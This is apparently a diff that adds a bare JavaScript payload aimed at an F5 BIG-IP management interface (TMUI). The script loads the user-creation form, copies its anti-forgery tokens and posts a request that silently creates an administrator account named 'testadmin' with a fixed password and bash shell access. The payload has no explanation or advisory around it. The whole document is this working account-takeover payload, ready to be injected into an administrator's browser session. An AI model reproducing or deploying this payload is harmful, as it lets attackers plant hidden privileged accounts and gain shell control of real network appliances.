@@ -1,0 +1,27 @@
+<script>
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+if (xmlhttp.readyState==4)
+{
+var postrequest = new XMLHttpRequest();
+xmlForm = xmlhttp.responseXML.getElementById('myform');
+var timenowvalue = encodeURIComponent(xmlForm.elements['_timenow'].value);
+var timebeforevalue =
+encodeURIComponent(xmlForm.elements['_timenow_before'].value);
+var bufvalue = encodeURIComponent(xmlForm.elements['_bufvalue'].value);
+var bufvaluebefore =
+encodeURIComponent(xmlForm.elements['_bufvalue_before'].value);
+var parameters =
+"_timenow="+timenowvalue+"&_timenow_before="+timebeforevalue+"&_bufvalue="+bufvalue+"&_bufvalue_before="+bufvaluebefore+"&_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Fuser%2Fcreate&handler_before=%2Ftmui%2Fsystem%2Fuser%2Fcreate&showObjList=shell_with_bash&showObjList_before=&hideObjList=partition_row%2Cshell_no_bash&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Fuser%2Fcreate&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Fuser%2Fcreate&linked_add_id=&linked_add_id_before=&exit_page=%2Ftmui%2Fsystem%2Fuser%2Flist.jsp&exit_page_before=%2Ftmui%2Fsystem%2Fuser%2Flist.jsp&user_role_before=900&user_role_before_before=900&form_page=%2Ftmui%2Fsystem%2Fuser%2Fcreate.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Fuser%2Fcreate.jsp%3F&name=testadmin&name_before=&name_validation=NO_VALIDATION&name_required=1&passwd=testing123&passwd_before=&passwd_validation=com.f5.form.PasswordValidator&passwd_validationparam1=passwd_confirm&passwd_required=1&passwd_confirm=testing123&passwd_confirm_before=&passwd_confirm_validation=NO_VALIDATION&passwd_confirm_required=1&user_role=0&user_role_before=900&shell_with_bash=bash&shell_with_bash_before=disable&exit_button_before=Cancel&repeat_before=Repeat&finished=Finished&finished_before=Finished";
+postrequest.open("POST", "/tmui/Control/form", true)
+postrequest.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded")
+postrequest.send(parameters)
+}
+}
+xmlhttp.open("GET", "/tmui/Control/jspmap/tmui/system/user/create.jsp",
+true);
+xmlhttp.responseType = "document";
+xmlhttp.send();
+</script>
